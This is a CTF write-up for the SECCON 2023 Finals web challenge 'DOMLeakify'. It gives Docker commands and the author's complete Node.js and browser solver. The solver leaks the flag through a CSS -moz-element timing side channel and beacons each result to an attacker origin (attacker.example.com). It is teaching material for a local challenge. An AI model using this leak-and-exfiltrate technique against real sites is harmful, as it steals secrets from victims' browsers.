---
title: "Domleakify - SECCON CTF 2023 Finals"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "domleakify", "web", "seccon-ctf-2023-finals"]
summary: "Launch a challenge server:"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_SECCON_CTF_2023_Finals/web/domleakify"
license: "none stated"
ctf:
  name: "SECCON CTF 2023 Finals"
  year: 2023
  challenge: "Domleakify"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_SECCON_CTF_2023_Finals/web/domleakify>
- **CTF:** SECCON CTF 2023 Finals

---

# [web] DOMLeakify

## Description

NO LEAK, NO LIFE.

- Challenge: `http://domleakify.{int,dom}.seccon.games:3000`
- Admin bot: `http://domleakify.{int,dom}.seccon.games:1337`

## Attachments

- [domleakify](files/domleakify)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:
```
docker run -it \
    -e WEB_BASE_URL=http://localhost:3000 \
    -e BOT_BASE_URL=http://localhost:1337 \
    -e ATTACKER_BASE_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solver)
```

where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_SECCON_CTF_2023_Finals/web/domleakify/solver/index.js>

```javascript
const fastify = require("fastify")();
const path = require("node:path");

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? fail("No BOT_BASE_URL");
const ATTACKER_BASE_URL =
  process.env.ATTACKER_BASE_URL ?? fail("No ATTACKER_BASE_URL");
const PORT = "8080";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const start = async () => {
  let known = "SECCON{";

  fastify.register(require("@fastify/static"), {
    root: path.join(__dirname, "public"),
  });

  fastify.post("/debug", async (req, reply) => {
    console.debug("DEBUG:", req.body.trim());
    return "";
  });

  fastify.post("/leaked", async (req, reply) => {
    known = req.body.trim();
    console.log(known);
    return "";
  });

  fastify.post("/flag", async (req, reply) => {
    // You got a flag!
    console.log("Flag:", req.body);
    process.exit(0);
  });

  fastify.listen({ port: PORT, host: "0.0.0.0" }, async (err, address) => {
    if (err) fail(err.toString());

    await sleep(3 * 1000);
    for (let i = 0; i < 5; i++) {
      console.log(`Report ${i + 1}:`);
      await reportUrl(
        `${ATTACKER_BASE_URL}?${new URLSearchParams({
          baseUrl: "http://web:3000",
          known,
        })}`
      );
    }

    fail("Failed");
  });
};
start();
```


## Solver: `main.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_SECCON_CTF_2023_Finals/web/domleakify/solver/public/main.js>

```javascript
const BASE_URL = new URLSearchParams(location.search).get("baseUrl");
const KNOWN = new URLSearchParams(location.search).get("known");
const CHARS = "}_abcdefghijklmnopqrstuvwxyz";

const sleep = async (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const wait = (win) =>
  new Promise(async (resolve) => {
    while (true) {
      try {
        win.document;
      } catch {
        resolve();
        break;
      }
      await sleep(5);
    }
  });

const measure = async (prefix) => {
  const hex = [...prefix]
    .map((c) => "\\" + c.charCodeAt(0).toString(16).padStart(2, "0"))
    .join("");
  const url = `${BASE_URL}#${encodeURIComponent(
    `<div style="background-image: -moz-element(#${hex}); height: 1000px; transform: scale(200) translate(50%, 0%); filter: drop-shadow(36px 36px 36px blue);"></div>`
  )}`;

  const ws = [];

  ws.push(open(url));
  await Promise.all(ws.map((w) => wait(w)));
  await sleep(100);

  let start = performance.now();
  for (let i = 0; i < 3; i++) {
    ws.push(open(BASE_URL));
  }
  await Promise.all(ws.map((w) => wait(w)));
  const end = performance.now();

  for (const w of ws) {
    w.close();
  }
  return end - start;
};

const getThreshold = async () => {
  const t = await measure("@");
  await sleep(50);
  return t * 3;
};

const leak = async (known) => {
  const TRY_NUM = 2;

  while (true) {
    let threshold = await getThreshold();
    console.log({ threshold });

    for (const c of CHARS) {
      for (let i = 0; i < TRY_NUM; i++) {
        const t = await measure(known + c);
        console.log({ c, t });
        navigator.sendBeacon(
          `${location.origin}/debug`,
          JSON.stringify({ known, c, t })
        );

        if (t < threshold) break;
        if (i === TRY_NUM - 1) return c;

        await sleep(2000);
        threshold = await getThreshold();
      }
    }
  }
};

const main = async () => {
  let known = KNOWN;
  while (!known.endsWith("}")) {
    known += await leak(known);
    console.log(known);
    navigator.sendBeacon(`${location.origin}/leaked`, known);
    await sleep(2000);
  }
  navigator.sendBeacon(`${location.origin}/flag`, known);
};
main();
```
